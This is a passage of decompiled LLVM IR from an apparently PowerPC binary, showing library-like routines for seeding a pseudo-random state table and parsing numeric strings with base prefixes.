  br i1 %v2_10008488, label %dec_label_pc_100084ac, label %dec_label_pc_100084a4

dec_label_pc_100084a4:                            ; preds = %dec_label_pc_10008468
  %v0_100084a4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_100084a4, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_100084b4

dec_label_pc_100084ac:                            ; preds = %dec_label_pc_10008468
  %v2_10008480 = icmp ult i32 %v1_10008478, %v3_10008470
  br i1 %v2_10008480, label %dec_label_pc_100084b4, label %dec_label_pc_100084b0

dec_label_pc_100084b0:                            ; preds = %dec_label_pc_100084ac
  %v0_100084b0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_100084b0, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_100084b4

dec_label_pc_100084b4:                            ; preds = %dec_label_pc_100084ac, %dec_label_pc_100084a4, %dec_label_pc_100084b0
  %v0_100084b4 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_100084b4, i32* %v2_1000846c, align 4
  %v0_100084b8 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_100084b8, i32* %arg1, align 4
  br label %dec_label_pc_100084bc

dec_label_pc_100084bc:                            ; preds = %dec_label_pc_1000844c, %dec_label_pc_100084b4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_10008490, { 1, 0 }
  uselistorder i32 %v1_10008478, { 1, 0 }
  uselistorder i32 %v3_10008470, { 1, 0 }
  uselistorder i32 %v3_1000846c, { 1, 0, 2 }
  uselistorder i32 %v1_10008458, { 1, 0 }
  uselistorder i32 %tmp, { 2, 1, 0, 3 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r10.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100084bc, { 1, 0 }
  uselistorder label %dec_label_pc_100084b4, { 2, 0, 1 }
}

define i32 @function_100084c4() local_unnamed_addr {
dec_label_pc_100084c4:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_100084c8 = load i32, i32* @lr, align 4
  store i32 %v0_100084c8, i32* %r0.global-to-local, align 4
  %v0_100084d4 = load i32, i32* @r4, align 4
  store i32 %v0_100084d4, i32* @r30, align 4
  %v1_100084dc = add i32 %v0_100084d4, 12
  %v2_100084dc = inttoptr i32 %v1_100084dc to i32*
  %v3_100084dc = load i32, i32* %v2_100084dc, align 4
  store i32 %v3_100084dc, i32* %r0.global-to-local, align 4
  %v2_100084e0 = icmp ugt i32 %v3_100084dc, 4
  br i1 %v2_100084e0, label %dec_label_pc_10008590, label %dec_label_pc_100084e8

dec_label_pc_100084e8:                            ; preds = %dec_label_pc_100084c4
  %v0_100084e8 = load i32, i32* @r3, align 4
  %v3_100084e8 = icmp eq i32 %v0_100084e8, 0
  %v1_100084ec = add i32 %v0_100084d4, 8
  %v2_100084ec = inttoptr i32 %v1_100084ec to i32*
  %v3_100084ec = load i32, i32* %v2_100084ec, align 4
  store i32 %v3_100084ec, i32* %r10.global-to-local, align 4
  br i1 %v3_100084e8, label %dec_label_pc_100084f4, label %dec_label_pc_100084f8

dec_label_pc_100084f4:                            ; preds = %dec_label_pc_100084e8
  store i32 1, i32* @r3, align 4
  br label %dec_label_pc_100084f8

dec_label_pc_100084f8:                            ; preds = %dec_label_pc_100084e8, %dec_label_pc_100084f4
  %v0_100084fc = phi i32 [ %v0_100084e8, %dec_label_pc_100084e8 ], [ 1, %dec_label_pc_100084f4 ]
  %v3_100084f8 = icmp eq i32 %v3_100084dc, 0
  %v2_100084fc = inttoptr i32 %v3_100084ec to i32*
  store i32 %v0_100084fc, i32* %v2_100084fc, align 4
  br i1 %v3_100084f8, label %dec_label_pc_1000858c, label %dec_label_pc_10008504

dec_label_pc_10008504:                            ; preds = %dec_label_pc_100084f8
  %v0_10008504 = load i32, i32* @r30, align 4
  %v1_10008504 = add i32 %v0_10008504, 16
  %v2_10008504 = inttoptr i32 %v1_10008504 to i32*
  %v3_10008504 = load i32, i32* %v2_10008504, align 4
  store i32 %v3_10008504, i32* %r11.global-to-local, align 4
  store i32 127773, i32* %r8.global-to-local, align 4
  store i32 2147483647, i32* %r7.global-to-local, align 4
  %v0_10008518 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v3_10008504, i32* %ctr.global-to-local, align 4
  %tmp18 = icmp sgt i32 %v3_10008504, 0
  br i1 %tmp18, label %dec_label_pc_10008558.preheader, label %dec_label_pc_10008558.preheader.thread

dec_label_pc_10008558.preheader.thread:           ; preds = %dec_label_pc_10008504
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000855c

dec_label_pc_10008558.preheader:                  ; preds = %dec_label_pc_10008504
  %v1_100085582 = add i32 %v3_10008504, -1
  store i32 %v1_100085582, i32* %ctr.global-to-local, align 4
  %v2_100085583 = icmp eq i32 %v1_100085582, 0
  br i1 %v2_100085583, label %dec_label_pc_1000855c, label %dec_label_pc_10008534

dec_label_pc_10008534:                            ; preds = %dec_label_pc_10008558.preheader, %dec_label_pc_10008554.dec_label_pc_10008534_crit_edge
  %v1_10008554 = phi i32 [ %v2_10008554, %dec_label_pc_10008554.dec_label_pc_10008534_crit_edge ], [ %v0_10008518, %dec_label_pc_10008558.preheader ]
  %v1_10008534 = phi i32 [ %v1_10008534.pre, %dec_label_pc_10008554.dec_label_pc_10008534_crit_edge ], [ 127773, %dec_label_pc_10008558.preheader ]
  %v0_10008534 = load i32, i32* @r3, align 4
  %v2_10008534 = sdiv i32 %v0_10008534, %v1_10008534
  %v2_10008538 = mul i32 %v2_10008534, %v1_10008534
  %v1_1000853c = mul i32 %v2_10008534, 2836
  store i32 %v1_1000853c, i32* %r0.global-to-local, align 4
  %v2_10008540 = sub i32 %v0_10008534, %v2_10008538
  %v1_10008544 = mul i32 %v2_10008540, 16807
  %v2_10008548 = sub i32 %v1_10008544, %v1_1000853c
  store i32 %v2_10008548, i32* @r3, align 4
  %tmp19 = icmp sgt i32 %v2_10008548, -1
  br i1 %tmp19, label %dec_label_pc_10008554, label %dec_label_pc_10008550

dec_label_pc_10008550:                            ; preds = %dec_label_pc_10008534
  %v1_10008550 = load i32, i32* %r7.global-to-local, align 4
  %v2_10008550 = add i32 %v1_10008550, %v2_10008548
  store i32 %v2_10008550, i32* @r3, align 4
  br label %dec_label_pc_10008554

dec_label_pc_10008554:                            ; preds = %dec_label_pc_10008534, %dec_label_pc_10008550
  %v0_10008554 = phi i32 [ %v2_10008548, %dec_label_pc_10008534 ], [ %v2_10008550, %dec_label_pc_10008550 ]
  %v2_10008554 = add i32 %v1_10008554, 4
  %v3_10008554 = inttoptr i32 %v2_10008554 to i32*
  store i32 %v0_10008554, i32* %v3_10008554, align 4
  %v0_10008558 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10008558 = add i32 %v0_10008558, -1
  store i32 %v1_10008558, i32* %ctr.global-to-local, align 4
  %v2_10008558 = icmp eq i32 %v1_10008558, 0
  br i1 %v2_10008558, label %dec_label_pc_10008558.dec_label_pc_1000855c_crit_edge, label %dec_label_pc_10008554.dec_label_pc_10008534_crit_edge

dec_label_pc_10008554.dec_label_pc_10008534_crit_edge: ; preds = %dec_label_pc_10008554
  %v1_10008534.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10008534

dec_label_pc_10008558.dec_label_pc_1000855c_crit_edge: ; preds = %dec_label_pc_10008554
  %v0_1000855c.pre = load i32, i32* @r30, align 4
  %v0_10008560.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_10008564.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000855c

dec_label_pc_1000855c:                            ; preds = %dec_label_pc_10008558.preheader.thread, %dec_label_pc_10008558.dec_label_pc_1000855c_crit_edge, %dec_label_pc_10008558.preheader
  %v0_10008564 = phi i32 [ %v0_10008564.pre, %dec_label_pc_10008558.dec_label_pc_1000855c_crit_edge ], [ %v0_10008518, %dec_label_pc_10008558.preheader ], [ %v0_10008518, %dec_label_pc_10008558.preheader.thread ]
  %v0_10008560 = phi i32 [ %v0_10008560.pre, %dec_label_pc_10008558.dec_label_pc_1000855c_crit_edge ], [ %v3_10008504, %dec_label_pc_10008558.preheader ], [ %v3_10008504, %dec_label_pc_10008558.preheader.thread ]
  %v1_10008564 = phi i32 [ %v0_1000855c.pre, %dec_label_pc_10008558.dec_label_pc_1000855c_crit_edge ], [ %v0_10008504, %dec_label_pc_10008558.preheader ], [ %v0_10008504, %dec_label_pc_10008558.preheader.thread ]
  %v1_1000855c = add i32 %v1_10008564, 20
  %v2_1000855c = inttoptr i32 %v1_1000855c to i32*
  %v3_1000855c = load i32, i32* %v2_1000855c, align 4
  store i32 %v3_1000855c, i32* %r0.global-to-local, align 4
  %v1_10008560 = mul i32 %v0_10008560, 10
  store i32 %v1_10008560, i32* %r31.global-to-local, align 4
  %v2_10008564 = add i32 %v1_10008564, 4
  %v3_10008564 = inttoptr i32 %v2_10008564 to i32*
  store i32 %v0_10008564, i32* %v3_10008564, align 4
  %v0_10008568 = load i32, i32* %r0.global-to-local, align 4
  %v1_10008568 = mul i32 %v0_10008568, 4
  %v0_1000856c = load i32, i32* %r10.global-to-local, align 4
  %v2_1000856c = add i32 %v0_1000856c, %v1_10008568
  store i32 %v2_1000856c, i32* %r0.global-to-local, align 4
  %v1_10008570 = load i32, i32* @r30, align 4
  %v2_10008570 = inttoptr i32 %v1_10008570 to i32*
  store i32 %v2_1000856c, i32* %v2_10008570, align 4
  %v2_10008584 = ptrtoint i32* %stack_var_-24 to i32
  %v0_1000857c21 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000857c22 = add i32 %v0_1000857c21, -1
  store i32 %v1_1000857c22, i32* @r31, align 4
  %tmp2025 = icmp sgt i32 %v1_1000857c22, -1
  br i1 %tmp2025, label %dec_label_pc_10008578, label %dec_label_pc_1000858c

dec_label_pc_10008578:                            ; preds = %dec_label_pc_1000855c, %dec_label_pc_10008578
  %v0_1000858026 = load i32, i32* @r30, align 4
  %v2_10008578 = inttoptr i32 %v0_1000858026 to i32*
  %v3_10008578 = call i32 @function_10008434(i32* %v2_10008578, i32 %v2_10008584)
  %v0_1000857c = load i32, i32* @r31, align 4
  %v1_1000857c = add i32 %v0_1000857c, -1
  store i32 %v1_1000857c, i32* @r31, align 4
  %tmp20 = icmp sgt i32 %v1_1000857c, -1
  br i1 %tmp20, label %dec_label_pc_10008578, label %dec_label_pc_1000858c

dec_label_pc_1000858c:                            ; preds = %dec_label_pc_1000855c, %dec_label_pc_10008578, %dec_label_pc_100084f8
  br label %dec_label_pc_10008590

dec_label_pc_10008590:                            ; preds = %dec_label_pc_100084c4, %dec_label_pc_1000858c
  %v0_10008594 = phi i32 [ -1, %dec_label_pc_100084c4 ], [ 0, %dec_label_pc_1000858c ]
  store i32 %v0_100084c8, i32* %r0.global-to-local, align 4
  ret i32 %v0_10008594

; uselistorder directives
  uselistorder i32 %v1_10008558, { 1, 0 }
  uselistorder i32 %v2_10008554, { 1, 0 }
  uselistorder i32 %v2_10008548, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10008534, { 1, 0 }
  uselistorder i32 %v0_10008518, { 1, 2, 0 }
  uselistorder i32 %v3_10008504, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32* %r10.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %ctr.global-to-local, { 0, 3, 4, 2, 1 }
  uselistorder label %dec_label_pc_10008590, { 1, 0 }
  uselistorder label %dec_label_pc_1000858c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10008578, { 1, 0 }
  uselistorder label %dec_label_pc_1000855c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10008554, { 1, 0 }
  uselistorder label %dec_label_pc_10008534, { 1, 0 }
  uselistorder label %dec_label_pc_100084f8, { 1, 0 }
}

define i32 @function_100085a8(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_100085a8:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_100085ac = load i32, i32* @lr, align 4
  store i32 %v0_100085ac, i32* %r0.global-to-local, align 4
  %v2_100085b0 = icmp ugt i32 %arg2, 127
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000ec70.271 to i32), i32* %r11.global-to-local, align 4
  store i32 %tmp, i32* %r27.global-to-local, align 4
  %v1_100085c8 = sub i32 255, %arg2
  %v2_100085c8 = sub i32 -1, %arg2
  %not.v5_100085c8 = icmp ugt i32 %v1_100085c8, %v2_100085c8
  %v6_100085cc = sext i1 %not.v5_100085c8 to i32
  %v1_100085d0 = add i32 %tmp, 4
  store i32 %v1_100085d0, i32* %r29.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  %v1_100085e0 = sub nsw i32 3, %v6_100085cc
  store i32 %v1_100085e0, i32* @r31, align 4
  br i1 %v2_100085b0, label %dec_label_pc_10008608, label %dec_label_pc_100085e8

dec_label_pc_100085e8:                            ; preds = %dec_label_pc_100085a8
  %v2_100085bc = icmp ugt i32 %arg2, 31
  %v1_100085e8 = sub i32 63, %arg2
  %not.v5_100085e8 = icmp ugt i32 %v1_100085e8, %v2_100085c8
  %v6_100085ec = sext i1 %not.v5_100085e8 to i32
  %v1_100085f4 = sub nsw i32 1, %v6_100085ec
  store i32 %v1_100085f4, i32* @r31, align 4
  br i1 %v2_100085bc, label %dec_label_pc_10008608, label %dec_label_pc_100085fc

dec_label_pc_100085fc:                            ; preds = %dec_label_pc_100085e8
  store i32 22, i32* %r28.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %tmp6 = icmp ult i32 %arg2, 8
  br i1 %tmp6, label %dec_label_pc_10008668, label %dec_label_pc_10008608

dec_label_pc_10008608:                            ; preds = %dec_label_pc_100085fc, %dec_label_pc_100085e8, %dec_label_pc_100085a8
  %v0_10008608 = phi i32 [ 0, %dec_label_pc_100085fc ], [ %v1_100085f4, %dec_label_pc_100085e8 ], [ %v1_100085e0, %dec_label_pc_100085a8 ]
  %v1_10008608 = mul nsw i32 %v0_10008608, 4
  store i32 %v1_10008608, i32* %r0.global-to-local, align 4
  %v2_1000860c = add i32 %arg3, 12
  %v3_1000860c = inttoptr i32 %v2_1000860c to i32*
  store i32 %v0_10008608, i32* %v3_1000860c, align 4
  %v0_10008610 = load i32, i32* %r0.global-to-local, align 4
  %v1_10008610 = load i32, i32* %r11.global-to-local, align 4
  %v2_10008610 = add i32 %v1_10008610, %v0_10008610
  store i32 %v2_10008610, i32* %r9.global-to-local, align 4
  %v3_10008614 = inttoptr i32 %v2_10008610 to i32*
  %v4_10008614 = load i32, i32* %v3_10008614, align 4
  store i32 %v4_10008614, i32* %r0.global-to-local, align 4
  %v1_10008618 = add i32 %v2_10008610, 20
  %v2_10008618 = inttoptr i32 %v1_10008618 to i32*
  %v3_10008618 = load i32, i32* %v2_10008618, align 4
  store i32 %v3_10008618, i32* %r9.global-to-local, align 4
  %v0_1000861c = load i32, i32* %r29.global-to-local, align 4
  %v1_1000861c = load i32, i32* %r30.global-to-local, align 4
  %v2_1000861c = add i32 %v1_1000861c, 8
  %v3_1000861c = inttoptr i32 %v2_1000861c to i32*
  store i32 %v0_1000861c, i32* %v3_1000861c, align 4
  %v0_10008620 = load i32, i32* %r0.global-to-local, align 4
  %v1_10008620 = load i32, i32* %r30.global-to-local, align 4
  %v2_10008620 = add i32 %v1_10008620, 20
  %v3_10008620 = inttoptr i32 %v2_10008620 to i32*
  store i32 %v0_10008620, i32* %v3_10008620, align 4
  %v0_10008624 = load i32, i32* %r9.global-to-local, align 4
  %v1_10008624 = mul i32 %v0_10008624, 4
  store i32 %v1_10008624, i32* %r0.global-to-local, align 4
  %v1_10008628 = load i32, i32* %r30.global-to-local, align 4
  %v2_10008628 = add i32 %v1_10008628, 16
  %v3_10008628 = inttoptr i32 %v2_10008628 to i32*
  store i32 %v0_10008624, i32* %v3_10008628, align 4
  %v0_1000862c = load i32, i32* %r29.global-to-local, align 4
  %v1_1000862c = load i32, i32* %r0.global-to-local, align 4
  %v2_1000862c = add i32 %v1_1000862c, %v0_1000862c
  store i32 %v2_1000862c, i32* %r0.global-to-local, align 4
  %v1_10008630 = load i32, i32* %r30.global-to-local, align 4
  %v2_10008630 = add i32 %v1_10008630, 24
  %v3_10008630 = inttoptr i32 %v2_10008630 to i32*
  store i32 %v2_1000862c, i32* %v3_10008630, align 4
  store i32 ptrtoint (i32* @global_var_10008638.273 to i32), i32* @lr, align 4
  %v0_10008634 = call i32 @function_100084c4()
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1000863c = load i32, i32* @r31, align 4
  %v3_1000863c = icmp eq i32 %v0_1000863c, 0
  %v1_10008640 = load i32, i32* %r27.global-to-local, align 4
  %v2_10008640 = inttoptr i32 %v1_10008640 to i32*
  store i32 0, i32* %v2_10008640, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v3_1000863c, label %dec_label_pc_1000867c, label %dec_label_pc_1000864c

dec_label_pc_1000864c:                            ; preds = %dec_label_pc_10008608
  %v0_1000864c = load i32, i32* @r30, align 4
  %v1_1000864c = add i32 %v0_1000864c, 4
  %v2_1000864c = inttoptr i32 %v1_1000864c to i32*
  %v3_1000864c = load i32, i32* %v2_1000864c, align 4
  %v0_10008650 = load i32, i32* %r29.global-to-local, align 4
  %v2_10008650 = sub i32 %v3_1000864c, %v0_10008650
  %v4_10008654 = sdiv i32 %v2_10008650, 4
  %v1_10008658 = mul i32 %v4_10008654, 5
  %v1_1000865c = load i32, i32* @r31, align 4
  %v2_1000865c = add i32 %v1_10008658, %v1_1000865c
  store i32 %v2_1000865c, i32* %r0.global-to-local, align 4
  %v1_10008660 = load i32, i32* %r27.global-to-local, align 4
  %v2_10008660 = inttoptr i32 %v1_10008660 to i32*
  store i32 %v2_1000865c, i32* %v2_10008660, align 4
  %v0_1000868c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000867c

dec_label_pc_10008668:                            ; preds = %dec_label_pc_100085fc
  %v0_10008668 = call i32 @function_10004b48()
  store i32 %v0_10008668, i32* %r3.global-to-local, align 4
  %v0_1000866c = load i32, i32* %r28.global-to-local, align 4
  %v2_1000866c = inttoptr i32 %v0_10008668 to i32*
  store i32 %v0_1000866c, i32* %v2_1000866c, align 4
  %v0_10008670 = call i32 @function_10004b48()
  %v0_10008674 = load i32, i32* %r28.global-to-local, align 4
  %v2_10008674 = inttoptr i32 %v0_10008670 to i32*
  store i32 %v0_10008674, i32* %v2_10008674, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000867c

dec_label_pc_1000867c:                            ; preds = %dec_label_pc_10008608, %dec_label_pc_1000864c, %dec_label_pc_10008668
  %v0_1000868c = phi i32 [ 0, %dec_label_pc_10008608 ], [ %v0_1000868c.pre, %dec_label_pc_1000864c ], [ -1, %dec_label_pc_10008668 ]
  store i32 %v0_100085ac, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000868c

; uselistorder directives
  uselistorder i32 %v0_10008624, { 1, 0 }
  uselistorder i32 %v2_10008610, { 1, 0, 2 }
  uselistorder i32 %v0_10008608, { 1, 0 }
  uselistorder i32 %v2_100085c8, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 8, 9, 10 }
  uselistorder i32 ptrtoint (i32* @global_var_1000ec70.271 to i32), { 2, 1, 0, 3 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 2, 5, 0, 3, 4 }
  uselistorder label %dec_label_pc_1000867c, { 2, 1, 0 }
}

define i32 @function_10008690(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10008690:
  %r10.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* %r25.global-to-local, align 4
  store i32 10, i32* %r30.global-to-local, align 4
  store i32 1, i32* %r26.global-to-local, align 4
  store i32 %tmp, i32* %r31.global-to-local, align 4
  %v3_100086c8 = load i32, i32* @global_var_1001044c, align 4
  store i32 %v3_100086c8, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_100086d4

dec_label_pc_100086d0:                            ; preds = %dec_label_pc_100086d4
  %v1_100086d0 = add i32 %v0_10008708, 1
  store i32 %v1_100086d0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100086d4

dec_label_pc_100086d4:                            ; preds = %dec_label_pc_10008690, %dec_label_pc_100086d0
  %v0_10008708 = phi i32 [ %tmp, %dec_label_pc_10008690 ], [ %v1_100086d0, %dec_label_pc_100086d0 ]
  %v1_100086d4 = inttoptr i32 %v0_10008708 to i8*
  %v2_100086d4 = load i8, i8* %v1_100086d4, align 1
  %v3_100086d4 = zext i8 %v2_100086d4 to i32
  %v1_100086d8 = mul nuw nsw i32 %v3_100086d4, 2
  %v2_100086dc = add i32 %v1_100086d8, %v3_100086c8
  %v3_100086dc = inttoptr i32 %v2_100086dc to i16*
  %v4_100086dc = load i16, i16* %v3_100086dc, align 2
  %v1_100086e0 = and i16 %v4_100086dc, 32
  %v3_100086e0 = icmp eq i16 %v1_100086e0, 0
  br i1 %v3_100086e0, label %dec_label_pc_100086e8, label %dec_label_pc_100086d0

dec_label_pc_100086e8:                            ; preds = %dec_label_pc_100086d4
  %v3_100086e8 = icmp eq i8 %v2_100086d4, 43
  br i1 %v3_100086e8, label %dec_label_pc_10008708, label %dec_label_pc_100086f0

dec_label_pc_100086f0:                            ; preds = %dec_label_pc_100086e8
  %v3_100086f0 = icmp eq i8 %v2_100086d4, 45
  store i32 0, i32* %r28.global-to-local, align 4
  br i1 %v3_100086f0, label %dec_label_pc_10008708, label %dec_label_pc_1000870c

dec_label_pc_10008708:                            ; preds = %dec_label_pc_100086e8, %dec_label_pc_100086f0
  %storemerge = phi i32 [ 1, %dec_label_pc_100086f0 ], [ 0, %dec_label_pc_100086e8 ]
  store i32 %storemerge, i32* %r28.global-to-local, align 4
  %v1_10008708 = add i32 %v0_10008708, 1
  store i32 %v1_10008708, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000870c

dec_label_pc_1000870c:                            ; preds = %dec_label_pc_100086f0, %dec_label_pc_10008708
  %v1_1000870c = call i32 @__asm_rlwinm.(i32 10, i32 0, i32 28, i32 26)
  %v4_1000870c = icmp eq i32 %v1_1000870c, 0
  br i1 %v4_1000870c, label %dec_label_pc_10008718, label %dec_label_pc_1000870c.dec_label_pc_10008754_crit_edge

dec_label_pc_1000870c.dec_label_pc_10008754_crit_edge: ; preds = %dec_label_pc_1000870c
  %v0_10008754.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10008754

dec_label_pc_10008718:                            ; preds = %dec_label_pc_1000870c
  %v0_10008718 = load i32, i32* %r31.global-to-local, align 4
  %v1_10008718 = inttoptr i32 %v0_10008718 to i8*
  %v2_10008718 = load i8, i8* %v1_10008718, align 1
  %v0_1000871c = load i32, i32* %r30.global-to-local, align 4
  %v1_1000871c = add i32 %v0_1000871c, 10
  store i32 %v1_1000871c, i32* %r30.global-to-local, align 4
  %v3_10008720 = icmp eq i8 %v2_10008718, 48
  br i1 %v3_10008720, label %dec_label_pc_10008728, label %dec_label_pc_10008748

dec_label_pc_10008728:                            ; preds = %dec_label_pc_10008718
  %v1_10008728 = add i32 %v0_10008718, 1
  %v2_10008728 = inttoptr i32 %v1_10008728 to i8*
  %v3_10008728 = load i8, i8* %v2_10008728, align 1
  %v4_10008728 = zext i8 %v3_10008728 to i32
  store i32 %v1_10008728, i32* %r31.global-to-local, align 4
  %v1_1000872c = add i32 %v0_1000871c, 8
  store i32 %v1_1000872c, i32* %r30.global-to-local, align 4
  %v1_10008730 = or i32 %v4_10008728, 32
  %v3_10008738 = icmp eq i32 %v1_10008730, 120
  br i1 %v3_10008738, label %dec_label_pc_10008740, label %dec_label_pc_10008748

dec_label_pc_10008740:                            ; preds = %dec_label_pc_10008728
  %v1_10008740 = mul i32 %v1_1000872c, 2
  store i32 %v1_10008740, i32* %r30.global-to-local, align 4
  %v1_10008744 = add i32 %v0_10008718, 2
  store i32 %v1_10008744, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10008748

dec_label_pc_10008748:                            ; preds = %dec_label_pc_10008728, %dec_label_pc_10008718, %dec_label_pc_10008740
  %v0_100087fc15 = phi i32 [ %v1_10008728, %dec_label_pc_10008740 ], [ %tmp, %dec_label_pc_10008718 ], [ %v1_10008728, %dec_label_pc_10008728 ]
  %v0_10008748 = phi i32 [ %v1_10008740, %dec_label_pc_10008740 ], [ %v1_1000871c, %dec_label_pc_10008718 ], [ %v1_1000872c, %dec_label_pc_10008728 ]
  %tmp22 = icmp slt i32 %v0_10008748, 17
  br i1 %tmp22, label %dec_label_pc_10008754, label %dec_label_pc_10008750

dec_label_pc_10008750:                            ; preds = %dec_label_pc_10008748
  store i32 16, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10008754

dec_label_pc_10008754:                            ; preds = %dec_label_pc_1000870c.dec_label_pc_10008754_crit_edge, %dec_label_pc_10008748, %dec_label_pc_10008750
  %v0_100087fc14 = phi i32 [ %tmp, %dec_label_pc_1000870c.dec_label_pc_10008754_crit_edge ], [ %v0_100087fc15, %dec_label_pc_10008748 ], [ %v0_100087fc15, %dec_label_pc_10008750 ]
  %v1_10008768 = phi i32 [ %v0_10008754.pre, %dec_label_pc_1000870c.dec_label_pc_10008754_crit_edge ], [ %v0_10008748, %dec_label_pc_10008748 ], [ 16, %dec_label_pc_10008750 ]
  %v1_10008754 = add i32 %v1_10008768, -2
  store i32 0, i32* %r10.global-to-local, align 4
  %v2_1000875c = icmp ugt i32 %v1_10008754, 34
  br i1 %v2_1000875c, label %dec_label_pc_100087f4, label %dec_label_pc_10008764

dec_label_pc_10008764:                            ; preds = %dec_label_pc_10008754
  %v2_10008768 = udiv i32 -1, %v1_10008768
  store i32 %v2_10008768, i32* %r29.global-to-local, align 4
  %v2_1000876c = mul i32 %v2_10008768, %v1_10008768
  %v1_10008770 = sub i32 -1, %v2_1000876c
  %v1_10008774 = urem i32 %v1_10008770, 256
  store i32 %v1_10008774, i32* %r27.global-to-local, align 4
  %v0_10008780.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10008780

dec_label_pc_1000877c:                            ; preds = %dec_label_pc_100087ec, %dec_label_pc_100087d4
  %v1_10008784.pre = phi i32 [ %v1_10008784, %dec_label_pc_100087ec ], [ %v1_10008784.pre.pre, %dec_label_pc_100087d4 ]
  %v0_10008784.pre = phi i32 [ %v2_100087ec, %dec_label_pc_100087ec ], [ %v0_10008784.pre.pre, %dec_label_pc_100087d4 ]
  %v0_1000877c = phi i32 [ %v1_100087b8, %dec_label_pc_100087ec ], [ %v0_1000877c.pre, %dec_label_pc_100087d4 ]
  br label %dec_label_pc_10008780

dec_label_pc_10008780:                            ; preds = %dec_label_pc_10008764, %dec_label_pc_1000877c
  %v0_100087fc12 = phi i32 [ %v0_100087fc14, %dec_label_pc_10008764 ], [ %v0_1000877c, %dec_label_pc_1000877c ]
  %v0_100087b8 = phi i32 [ %v0_10008780.pre, %dec_label_pc_10008764 ], [ %v0_1000877c, %dec_label_pc_1000877c ]
  %v1_10008784 = phi i32 [ %v2_10008768, %dec_label_pc_10008764 ], [ %v1_10008784.pre, %dec_label_pc_1000877c ]
  %v0_100087c4 = phi i32 [ 0, %dec_label_pc_10008764 ], [ %v0_10008784.pre, %dec_label_pc_1000877c ]
  %v1_10008780 = inttoptr i32 %v0_100087b8 to i8*
  %v2_10008780 = load i8, i8* %v1_10008780, align 1
  %v3_10008780 = zext i8 %v2_10008780 to i32
  %v3_10008784 = icmp ugt i32 %v0_100087c4, %v1_10008784
  %v1_1000878c = add nuw nsw i32 %v3_10008780, 208
  %v1_10008790 = or i32 %v3_10008780, 32
  %v1_10008794 = urem i32 %v1_1000878c, 256
  %tmp23 = icmp ult i32 %v1_10008794, 10
  br i1 %tmp23, label %dec_label_pc_100087b4, label %dec_label_pc_100087a4

dec_label_pc_100087a4:                            ; preds = %dec_label_pc_10008780
  %tmp24 = icmp ult i32 %v1_10008790, 97
  br i1 %tmp24, label %dec_label_pc_100087b4, label %dec_label_pc_100087b0

dec_label_pc_100087b0:                            ; preds = %dec_label_pc_100087a4
  %v1_100087a4 = add nsw i32 %v1_10008790, -87
  %v1_100087b0 = urem i32 %v1_100087a4, 256
  br label %dec_label_pc_100087b4

dec_label_pc_100087b4:                            ; preds = %dec_label_pc_100087a4, %dec_label_pc_10008780, %dec_label_pc_100087b0
